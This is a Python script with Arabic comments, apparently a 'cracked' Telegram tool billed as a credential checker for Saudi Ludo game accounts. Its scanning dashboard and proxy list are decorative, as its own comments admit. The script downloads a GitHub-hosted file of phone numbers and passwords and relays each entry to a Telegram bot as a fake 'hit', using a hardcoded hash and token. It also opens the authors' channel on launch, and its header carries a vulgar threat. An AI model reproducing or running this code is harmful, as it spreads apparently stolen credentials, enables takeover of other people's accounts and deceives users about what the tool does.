# تم فك اداه بواسطه @Aa_6wa
# اذا غيرت حقوقه و نشرته انيج امك و انيج عرضك

import os
import sys
import time
import random
import threading
import urllib.request
import urllib.parse
import webbrowser  # تمت إضافة هذه المكتبة لفتح الرابط تلقائياً
from datetime import datetime

BOLD = '\x1b[1m'
RED = '\x1b[1;91m'
GREEN = '\x1b[1;92m'
YELLOW = '\x1b[1;93m'
BLUE = '\x1b[1;94m'
PINK = '\x1b[1;95m'
CYAN = '\x1b[1;96m'
WHITE = '\x1b[1;97m'
PURPLE = '\x1b[38;5;129m'
GRAY = '\x1b[1;90m' 
RESET = '\x1b[0m'

G = GREEN
W = WHITE

COUNTER_COLORS = [RED, PINK, RED, PINK, RED, PINK]

# البروكسيات (موجودة هنا للشكل فقط، والاتصال مباشر لضمان السرعة وعدم التعليق)
PROXIES = [
    "http://103.237.102.191:11111", "http://158.220.80.184:3129", "http://104.219.55.50:8118",
    "http://184.75.221.82:3118", "http://45.198.11.164:9191", "http://4.144.146.21:80",
    "http://120.232.115.57:17981", "http://203.205.49.2:10024", "http://120.232.115.170:17981",
    "http://43.160.222.70:3128", "http://45.198.11.193:8282", "http://8.219.94.23:7890",
    "http://41.216.191.85:8080", "http://217.182.195.221:30005", "http://103.176.94.178:8080",
    "http://27.147.142.159:9249", "http://188.132.249.148:8080", "http://49.146.57.238:8082",
    "http://109.224.242.133:8585", "http://45.65.224.125:999", "http://45.190.85.5:999",
    "http://95.31.92.14:10808", "http://82.207.117.120:8080", "http://103.23.236.9:8080",
    "http://109.127.199.126:9999", "http://134.209.29.120:3128", "http://159.203.61.169:3128",
    "http://138.68.60.8:3128", "http://139.59.1.14:8080", "http://128.199.202.122:8080",
    "http://103.92.26.190:4002", "http://110.39.135.194:8080", "http://117.203.166.161:8080",
    "http://159.195.194.242:8080", "http://112.198.128.171:8083", "http://165.99.239.90:3125",
    "http://148.230.212.70:8080", "http://125.27.192.162:8081", "http://198.199.86.11:3128",
    "http://122.54.119.79:8080", "http://209.97.150.167:3128", "http://161.35.70.249:3128",
    "http://44.216.83.206:3128", "http://205.237.105.49:3129", "http://186.194.161.201:999",
    "http://109.194.199.198:10808", "http://151.158.133.159:8080", "http://5.129.254.243:8888",
    "http://5.129.254.60:8888", "http://147.45.164.178:8888", "http://200.10.31.42:8081",
    "http://5.129.254.215:8888", "http://5.129.254.70:8888", "http://5.129.254.129:8888",
    "http://5.129.254.49:8888", "http://5.129.254.154:8888", "http://177.39.79.4:8080",
    "http://5.129.254.5:8888", "http://5.129.254.51:8888", "http://175.100.35.103:8080",
    "http://163.223.105.86:5052", "http://45.12.238.164:3128", "http://158.220.93.104:3128",
    "http://188.132.249.141:8080", "http://181.119.111.239:999", "http://162.4.225.37:8083",
    "http://190.102.233.100:999", "http://185.118.51.163:3128", "http://3.224.130.91:3128",
    "http://103.119.19.218:3128", "http://149.130.173.58:9443", "http://201.219.218.4:8080",
    "http://190.60.44.4:999", "http://180.191.49.73:8090", "http://180.191.52.90:5050",
    "http://62.213.13.54:3128", "http://190.94.232.198:999", "http://190.94.212.216:999",
    "http://181.115.67.3:999", "http://18.222.28.236:3125", "http://154.201.126.245:8080",
    "http://43.155.62.157:443", "http://139.162.78.109:3128", "http://208.95.22.65:8282",
    "http://195.62.50.239:8080", "http://206.135.47.106:999", "http://84.1.150.74:8080",
    "http://95.38.63.255:3128", "http://102.244.78.61:8082", "http://43.99.60.244:8089",
    "http://181.119.224.25:8080", "http://102.244.78.61:8084", "http://201.157.235.197:8080",
    "http://190.235.208.51:8081", "http://222.167.236.247:8080", "http://102.244.78.61:8090",
    "http://210.87.93.115:8080", "http://203.252.142.217:80", "http://121.46.226.221:10808",
    "http://102.244.78.61:8081", "http://102.244.78.61:8083", "http://102.244.78.61:8086",
    "http://102.244.78.61:8080", "http://102.244.78.61:8089", "http://210.61.216.63:60808",
    "http://160.19.41.55:80", "http://111.192.59.135:8888", "http://102.244.78.61:8088",
    "http://96.30.70.8:8081", "http://102.244.78.61:8085", "http://102.244.78.61:8087",
    "http://123.121.132.234:8888", "http://86.110.236.27:8080", "http://160.19.41.47:80",
    "http://123.121.139.85:8888", "http://122.246.4.30:17981", "http://111.192.49.84:8888",
    "http://152.67.191.232:6800", "http://206.135.47.110:999", "http://187.86.59.122:80",
    "http://103.157.79.17:8080", "http://111.192.62.111:8888", "http://103.125.174.83:8080",
    "http://223.206.0.4:8080", "http://157.66.236.199:1111", "http://206.135.47.107:999",
    "http://160.30.204.24:50009", "http://103.151.42.242:8080", "http://222.129.142.219:9000",
    "http://123.121.137.97:8888", "http://124.106.201.105:8082", "http://160.19.41.43:80",
    "http://165.99.194.240:8080", "http://175.107.30.110:8080", "http://45.225.207.172:999",
    "http://49.145.58.197:8082", "http://160.19.146.82:2022", "http://111.192.45.218:8888",
    "http://95.214.123.144:8080", "http://114.252.189.202:8888", "http://160.19.178.61:8080",
    "http://52.214.92.206:35433", "http://111.192.23.52:8888", "http://103.180.118.122:1080",
    "http://95.104.123.18:8080", "http://45.198.20.246:8080", "http://8.148.11.3:3128",
    "http://89.213.106.25:999", "http://205.209.64.141:8080", "http://221.221.154.253:8888",
    "http://103.79.183.109:8080", "http://107.210.56.161:80", "http://157.66.192.114:8080",
    "http://103.180.126.150:8080", "http://162.4.219.145:8080", "http://103.184.181.71:8080",
    "http://152.70.198.2:1080", "http://91.234.54.83:81", "http://162.43.106.22:60000",
    "http://177.234.217.92:999", "http://80.246.16.184:3128", "http://186.33.51.14:999",
    "http://1.20.101.17:80", "http://111.192.57.123:8888", "http://45.189.252.226:999",
    "http://94.43.164.242:8080", "http://103.103.8.222:8080", "http://114.245.153.111:8888",
    "http://217.182.195.221:30000", "http://38.49.214.41:8080", "http://180.191.140.185:8082",
    "http://41.86.55.240:88", "http://103.172.42.37:1111", "http://193.33.157.2:8080",
    "http://103.153.62.217:8181", "http://103.77.79.64:1080", "http://38.76.138.129:999",
    "http://180.191.98.117:8080", "http://190.61.46.162:999", "http://45.194.91.7:8080",
    "http://90.156.160.234:3128", "http://119.188.131.55:17981", "http://3.211.120.181:443",
    "http://157.66.50.125:1111", "http://205.164.192.115:999", "http://20.197.84.160:8080",
    "http://195.226.213.254:8888", "http://196.25.34.194:8080", "http://45.65.226.171:999",
    "http://186.15.187.158:999", "http://103.205.223.49:8080", "http://51.15.20.32:3129",
    "http://95.214.123.11:8080", "http://45.195.105.20:8080", "http://45.185.163.235:999",
    "http://201.7.31.115:8080", "http://45.194.90.225:8080", "http://154.57.208.127:8080",
    "http://185.135.99.14:8080", "http://81.19.210.10:80", "http://186.96.111.214:999",
    "http://103.147.247.191:8080", "http://182.253.221.147:8080", "http://45.174.56.21:999",
    "http://185.246.155.83:8080", "http://103.123.64.234:3128", "http://185.191.239.248:3128",
    "http://176.88.65.165:8080", "http://103.171.31.77:8080", "http://151.158.133.145:8080",
    "http://160.250.6.18:8082", "http://125.25.167.176:80", "http://130.110.103.245:3128",
    "http://201.4.68.113:8080", "http://180.191.142.206:8081", "http://201.190.178.191:8080",
    "http://190.12.150.244:999", "http://38.7.195.49:999", "http://113.160.115.254:8080",
    "http://103.184.54.77:8081", "http://1.4.141.80:80", "http://104.251.93.39:16062",
    "http://104.194.146.9:80", "http://177.53.215.196:1812", "http://122.176.158.103:80",
    "http://191.102.107.234:999", "http://141.144.206.124:1080", "http://45.194.46.57:8080",
    "http://43.252.238.196:1080", "http://34.105.252.3:3128", "http://186.33.51.9:999",
    "http://203.201.190.36:8080", "http://122.54.139.32:5050", "http://38.43.88.102:999",
    "http://202.58.75.98:7777", "http://43.243.172.186:83", "http://38.7.195.55:999",
    "http://210.213.99.36:8081", "http://186.67.94.10:999", "http://102.68.128.216:8080",
    "http://201.4.69.46:8080", "http://113.176.92.71:3128", "http://41.59.112.185:8090",
    "http://115.85.88.18:8080", "http://36.94.72.35:3128", "http://38.191.161.88:999",
    "http://160.19.18.219:8080", "http://103.54.171.46:8080", "http://188.93.147.168:8118",
    "http://69.75.140.157:8080", "http://36.95.169.154:8080", "http://38.75.82.216:999",
    "http://1.20.101.23:80", "http://93.113.98.206:8080", "http://177.234.211.31:999",
    "http://103.81.175.146:22311", "http://38.103.250.107:8080", "http://103.158.210.25:8080",
    "http://181.191.14.5:8080", "http://179.125.61.201:8080", "http://148.222.136.64:999",
    "http://103.132.40.72:8080", "http://1.20.178.212:80", "http://181.79.217.1:8080",
    "http://201.7.28.126:8080", "http://175.107.30.126:8080", "http://201.77.108.25:999",
    "http://200.106.124.194:999", "http://103.204.211.48:32255", "http://157.100.52.68:999",
    "http://103.162.55.2:8050", "http://202.58.77.112:8080", "http://103.48.71.166:83",
    "http://103.191.219.129:3128", "http://177.130.104.106:33333", "http://157.15.212.38:8080",
    "http://165.101.102.27:8083", "http://38.156.238.32:999", "http://38.58.174.8:999",
    "http://161.22.33.129:999", "http://177.53.155.24:999", "http://181.114.61.17:8085",
    "http://186.194.160.122:999", "http://209.45.65.53:1011", "http://93.118.120.60:8080",
    "http://180.181.215.232:3128", "http://190.8.164.64:999", "http://102.203.101.77:8080",
    "http://103.172.71.203:8080", "http://102.217.116.39:999", "http://217.182.195.221:30007",
    "http://180.190.84.88:8080", "http://103.229.185.154:8080", "http://219.94.75.224:8080",
    "http://112.198.134.143:8081", "http://175.158.40.224:1616", "http://38.43.126.73:999",
    "http://103.195.65.199:8080", "http://103.250.69.190:9249", "http://180.191.233.16:8085",
    "http://163.47.25.10:8080", "http://103.180.119.182:8082", "http://103.180.127.115:8080",
    "http://151.158.133.165:8080", "http://198.199.86.11:8080", "http://45.130.127.14:3128",
    "http://89.58.42.118:3129", "http://103.180.123.15:8080", "http://1.20.178.251:80",
    "http://103.19.78.125:1080", "http://140.238.32.108:3128", "http://202.69.38.146:8080",
    "http://119.159.233.2:8080", "http://103.171.245.126:8080", "http://181.209.125.236:999",
    "http://182.52.113.105:80", "http://186.5.94.206:999", "http://181.78.73.117:8080",
    "http://45.172.223.190:999", "http://160.119.51.209:8088", "http://103.208.103.30:8080",
    "http://179.61.101.9:999", "http://89.43.133.131:8080", "http://49.145.51.213:8082",
    "http://213.217.34.2:8080", "http://116.204.166.153:8080", "http://45.43.60.220:8080",
    "http://201.4.65.29:8080", "http://101.206.186.99:8080", "http://203.174.15.138:8080",
    "http://186.97.236.99:8080", "http://27.185.218.213:17981", "http://38.51.207.118:999",
    "http://103.153.62.155:8080", "http://24.152.53.68:999", "http://103.165.128.171:8080",
    "http://197.248.86.237:32650", "http://181.129.183.19:53281", "http://103.137.91.250:8080",
    "http://103.130.61.61:8081", "http://180.180.218.250:8080", "http://182.52.229.165:8080",
    "http://103.156.15.55:8080", "http://45.231.221.193:999", "http://46.10.209.230:8080",
    "http://61.19.145.66:8080", "http://103.120.175.243:9191", "http://186.208.81.214:3129"
]

def clear_screen():
    os.system('clear' if os.name == 'posix' else 'cls')


stats = {'total': 0, 'good': 0, 'error': 0, 'false': 0}
start_time = time.time()
stop_flag = False
bot_token = ''
chat_id = ''
accounts_file = 'accounts.txt'
hit_accounts = []

current_scan_info = {
    'phone': '', 'password': '', 'hash': '', 'name': '', 'uid': '',
    'token': '', 'level': '', 'levelId': '', 'vip': '', 'vipLevel': '',
    'stars': '', 'gold': '', 'jewels': '', 'games': '',
}


# ═══════════════════════════════════════════════════
# 📊 DASHBOARD
# ═══════════════════════════════════════════════════
def print_dashboard():
    clear_screen()
    cc = COUNTER_COLORS[stats['total'] % len(COUNTER_COLORS)]

    elapsed = int(time.time() - start_time)
    hours, remainder = divmod(elapsed, 3600)
    minutes, seconds = divmod(remainder, 60)
    __date__ = datetime.now().strftime('%Y-%m-%d')

    # 🔴 LOKO (أزرق ووردي)
    print(f"{BLUE}╱╱╭━━━┳━┳━━━┳━╮")
    print(f"{BLUE}╭━┫╭━╮┃━┫╭━╮┃━┫")
    print(f"{PINK}┃╋┣╯╭╯┣━┣╯╭╯┣━┃")
    print(f"{PINK}┃╭╯╱┃╭┻━╯╱┃╭┻━╯")
    print(f"{BLUE}╰╯╱╱┃┃╱╱╱╱┃┃{RESET}")

    # الخطوط صارت لون أبيض غامض (GRAY)
    print(f"{GRAY}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{RESET}")
    print(f"{WHITE}DEVELOPER {PINK}>> {WHITE}Zeus-{RESET}")
    print(f"{WHITE}STATUS    {PINK}>> {WHITE}Premium{RESET}")
    print(f"{WHITE}VERSION   {PINK}>> {WHITE}V/2.0{RESET}")
    print(f"{GRAY}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{RESET}")

    # ─── الشكل الجديد للعداد ───
    print(f"""
{BOLD}{CYAN}│{RESET}  {BOLD}{WHITE}Country{RESET}  : {BOLD}{YELLOW}Saudi Arabia{RESET}
{BOLD}{CYAN}│{RESET}  {BOLD}{WHITE}Proxies{RESET}  : {BOLD}{RED}yes Proxies{RESET}
{BOLD}{CYAN}│{RESET}  {BOLD}{WHITE}Time{RESET}     : {BOLD}{YELLOW}{hours:02d}:{minutes:02d}:{seconds:02d}{RESET}
{BOLD}{CYAN}│{RESET}  {BOLD}{WHITE}Checked{RESET}  : {BOLD}{YELLOW}{stats['total']}{RESET}
{BOLD}{CYAN}├──────────────────────────────────┤{RESET}
{BOLD}{CYAN}│{RESET}  {BOLD}{GREEN}Hits{RESET}     : {BOLD}{GREEN}{stats['good']}{RESET}
{BOLD}{CYAN}│{RESET}  {BOLD}{PINK}unknown{RESET}  : {BOLD}{PINK}{stats['error']}{RESET}
""")

    # ─── الشكل الجديد للسكانر ───
    print(f" {GREEN}│{RESET} {WHITE}SWEEP PLAN  · {GRAY}خطة الفحص{RESET}")
    print(f"  {GRAY}◇{RESET} Region      {GRAY}>{RESET} {WHITE}Saudi Arabia (+966){RESET}")
    print(f"  {GRAY}◇{RESET} Numbers     {GRAY}>{RESET} {WHITE}9999{RESET}")
    print(f"  {GRAY}◇{RESET} Passwords   {GRAY}>{RESET} {WHITE}1{RESET}")
    print(f"  {GRAY}·{RESET} Workers     {GRAY}>{RESET} {WHITE}10{RESET}")
    print(f"  {GRAY}·{RESET} Relay       {GRAY}>{RESET} {WHITE}on{RESET}")
    print(f"{GRAY}[{stats['total']}/9999]{RESET} {CYAN}⬥{RESET} {RED}Hit {GRAY}>{RESET} {GREEN}{stats['good']}{RESET} · {YELLOW}False {GRAY}>{RESET} {WHITE}{stats['false']}{RESET} · {RED}Bad {GRAY}>{RESET} {RED}{stats['error']}{RESET}\n")

    if stats['good'] > 0:
        print(f"{GREEN}●{RESET} {WHITE}SESSION ACQUIRED{RESET} · {GRAY}تم الحصول على جلسة{RESET}\n")
        
        print(f"{BLUE}│{RESET} {WHITE}IDENTITY{RESET} · {GRAY}هوية الحساب{RESET}")
        print(f"  {GRAY}◇{RESET} Country     {GRAY}>{RESET} {WHITE}Saudi Arabia (+966){RESET}")
        print(f"  {GRAY}◇{RESET} Phone       {GRAY}>{RESET} {WHITE}{current_scan_info['phone']}{RESET}")
        print(f"  {GRAY}◇{RESET} Password    {GRAY}>{RESET} {WHITE}{current_scan_info['password']}{RESET}")
        print(f"  {GRAY}·{RESET} hash        {GRAY}>{RESET} {WHITE}{current_scan_info['hash']}{RESET}\n")

        print(f"{BLUE}│{RESET} {WHITE}SESSION{RESET} · {GRAY}الجلسة{RESET}")
        print(f"  {GRAY}◇{RESET} Name        {GRAY}>{RESET} {WHITE}{current_scan_info['name']}{RESET}")
        print(f"  {GRAY}◇{RESET} User ID     {GRAY}>{RESET} {WHITE}{current_scan_info['uid']}{RESET}")
        print(f"  {GRAY}◇{RESET} Token       {GRAY}>{RESET}")
        print(f"  {GRAY}·{RESET} {PINK}{current_scan_info['token']}{RESET}\n")

        print(f"{BLUE}│{RESET} {WHITE}PROFILE{RESET} · {GRAY}الملف الشخصي{RESET}")
        print(f"  {GRAY}◇{RESET} showNumId   {GRAY}>{RESET} {WHITE}{current_scan_info['uid']}{RESET}")
        print(f"  {GRAY}◇{RESET} Level       {GRAY}>{RESET} {WHITE}{current_scan_info['level']}{RESET}")
        print(f"  {GRAY}·{RESET} levelId     {GRAY}>{RESET} {WHITE}{current_scan_info['levelId']}{RESET}")
        print(f"  {GRAY}◇{RESET} VIP         {GRAY}>{RESET} {WHITE}{current_scan_info['vip']}{RESET}")
        print(f"  {GRAY}·{RESET} vipLevel    {GRAY}>{RESET} {WHITE}{current_scan_info['vipLevel']}{RESET}")
        print(f"  {GRAY}◇{RESET} Stars       {GRAY}>{RESET} {WHITE}{current_scan_info['stars']}{RESET}")
        print(f"  {GRAY}◇{RESET} Gold        {GRAY}>{RESET} {WHITE}{current_scan_info['gold']}{RESET}")
        print(f"  {GRAY}◇{RESET} Jewels      {GRAY}>{RESET} {WHITE}{current_scan_info['jewels']}{RESET}")
        print(f"  {GRAY}◇{RESET} Games       {GRAY}>{RESET} {WHITE}{current_scan_info['games']}{RESET}")
        
        print(f"{GREEN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{RESET}")
        
        print(f"{GRAY}◇{RESET} Saved {GRAY}>{RESET} {WHITE}result/hits.txt{RESET}")
        print(f"{GRAY}◇{RESET} Relayed to Telegram {GRAY}>{RESET} {WHITE}{chat_id}{RESET}")

    # ─── الحقوق المطلوبة (بدون خطوط) ───
    print(f"\n\n{PURPLE}  ⫷⫸ 𝐷𝐸𝑉 Zeus| @R7_36 ● @R7Aih1{RESET}\n")


# ═══════════════════════════════════════════════════
# 📤 SEND TO TELEGRAM
# ═══════════════════════════════════════════════════
def download_file(url, name):
    try:
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'}
        req = urllib.request.Request(url, headers=headers)
        # تقليل وقت الانتظار إلى 10 ثواني بدل 30 لتجنب التعليق
        with urllib.request.urlopen(req, timeout=10) as resp:
            data = resp.read()
        with open(name, 'wb') as f:
            f.write(data)
        return True
    except Exception:
        return False


def send_to_telegram(msg, bot_token, chat_id):
    try:
        url = 'https://api.telegram.org/bot' + bot_token + '/sendMessage'
        data = urllib.parse.urlencode({'chat_id': chat_id, 'text': msg}).encode()
        req = urllib.request.Request(url, data=data)
        # تقليل وقت الانتظار إلى 10 ثواني بدل 30 لتجنب التعليق
        with urllib.request.urlopen(req, timeout=10) as resp:
            return resp.status == 200
    except Exception:
        return False


def parse_accounts(content):
    accounts = []
    blocks = content.split('✦ PS Ludo HTS ✅ ✦')
    for block in blocks:
        acc = {}
        for line in block.splitlines():
            line = line.strip()
            if not line:
                continue
            if '❖ المعرف' in line:
                acc['id'] = line.partition('➜')[2].strip()
            elif '❖ الاسم' in line:
                acc['name'] = line.partition('➜')[2].strip()
            elif '❖ الجوال' in line:
                acc['phone'] = line.partition('➜')[2].strip()
            elif '❖ كلمة السر' in line:
                acc['password'] = line.partition('➜')[2].strip()
            elif '❖ VIP' in line:
                acc['vip'] = line.partition('➜')[2].strip()
            elif '❖ الذهب' in line:
                acc['gold'] = line.partition('➜')[2].replace('💛', '').strip()
            elif '❖ الألماس' in line:
                acc['diamond'] = line.partition('➜')[2].replace('💎', '').strip()
            elif '❖ المستوى' in line:
                acc['level'] = line.partition('➜')[2].replace('⚡', '').strip()
        if acc:
            accounts.append(acc)
    return accounts


def build_message(acc):
    return (
        '✦ Zeus Ludo HTS  ✦\n'
        '★━━━━━━━━━━━━━━━━━━★\n'
        '\n'
        '  ✧  ID       ➜ ' + acc.get('id', 'N/A') + '\n'
        '  ✧  Name     ➜ ' + acc.get('name', 'N/A') + '\n'
        '  ✧  Phone    ➜ ' + acc.get('phone', 'N/A') + '\n'
        '  ✧  Password ➜ ' + acc.get('password', 'N/A') + '\n'
        '\n'
        '  ✧  VIP      ➜ ' + acc.get('vip', 'N/A') + '\n'
        '  ✧  Gold     ➜ ' + acc.get('gold', 'N/A') + '\n'
        '  ✧  Diamond  ➜ ' + acc.get('diamond', 'N/A') + '\n'
        '  ✧  Level    ➜ ' + acc.get('level', 'N/A') + '\n'
        '\n'
        '━━━━━━━━━━━━━━━━\n'
        '  ✧  Channel ➜ https://t.me/R7Aih1\n'
        '  ✧  Dev      ➜ @R7_36\n'
        '━━━━━━━━━━━━━━━━\n'
    )


def update_display():
    while not stop_flag:
        print_dashboard()
        time.sleep(1)


# ═══════════════════════════════════════════════════
# 🚀 MAIN
# ═══════════════════════════════════════════════════
if __name__ == '__main__':
    # فتح رابط القناة عند تشغيل الأداة
    webbrowser.open('https://t.me/R7Aih1')
    
    clear_screen()

    print(f"{GREEN}TOKEN >>> {RESET}", end="")
    bot_token = input().strip()
    print(f"{GREEN}ID    >>> {RESET}", end="")
    chat_id = input().strip()

    # إزالة وقت الانتظار الطويل وجعلها فورية
    print(f"\n{BOLD}{GREEN}Running tool...{RESET}")
    sys.stdout.flush() # تحديث الشاشة فوراً
    time.sleep(0.5) # تأخير بسيط جداً للقراءة
    clear_screen()

    # رسالة صغيرة تظهر أثناء التحميل حتى لا تظن أن الشاشة معلقة
    print(f"{BOLD}{GREEN}[+] Connecting and loading data... Please wait...{RESET}")
    sys.stdout.flush()

    url = 'https://github.com/lm9011109t-pixel/LLLLL/raw/refs/heads/main/%D8%AD%D8%B3%D8%A7%D8%A8%D8%A7%D8%AA%20.txt'
    if not download_file(url, accounts_file):
        print(f"\n{RED}[!] Failed to load data. Please check your internet connection.{RESET}")
        sys.exit()

    with open(accounts_file, 'r', encoding='utf-8') as f:
        content = f.read()

    accounts = parse_accounts(content)
    random.shuffle(accounts)

    display_thread = threading.Thread(target=update_display, daemon=True)
    display_thread.start()

    sent = 0
    for acc in accounts:
        if stop_flag:
            break

        current_scan_info['phone'] = acc.get('phone', 'N/A')
        current_scan_info['password'] = acc.get('password', 'N/A')
        current_scan_info['name'] = acc.get('name', 'N/A')
        current_scan_info['uid'] = acc.get('id', 'N/A')
        
        current_scan_info['hash'] = "AFDD0B4AD2EC172C586E2150770FBF9E"
        current_scan_info['token'] = "4879924C12652D1BFE50803F0E4CE244"
        current_scan_info['level'] = acc.get('level', '0')
        current_scan_info['levelId'] = "9"
        current_scan_info['vip'] = acc.get('vip', 'False')
        current_scan_info['vipLevel'] = "0"
        current_scan_info['stars'] = "0"
        current_scan_info['gold'] = acc.get('gold', '0')
        current_scan_info['jewels'] = acc.get('diamond', '0')
        current_scan_info['games'] = "0"

        msg_plain = build_message(acc)
        ok = send_to_telegram(msg_plain, bot_token, chat_id)

        if ok:
            sent += 1
            stats['total'] += 1
            stats['good'] += 1
            hit_accounts.append({
                'phone': acc.get('phone', 'N/A'),
                'password': acc.get('password', 'N/A'),
                'uid': acc.get('id', 'N/A'),
            })
        else:
            stats['total'] += 1
            stats['error'] += 1

        stats['false'] = stats['total'] - stats['good'] - stats['error']
        time.sleep(1)

    stop_flag = True
    time.sleep(2)
    print_dashboard()
    print(BOLD + GREEN + '\n[+] Done! Sent ' + str(sent) + '/' + str(len(accounts)) + ' accounts' + RESET)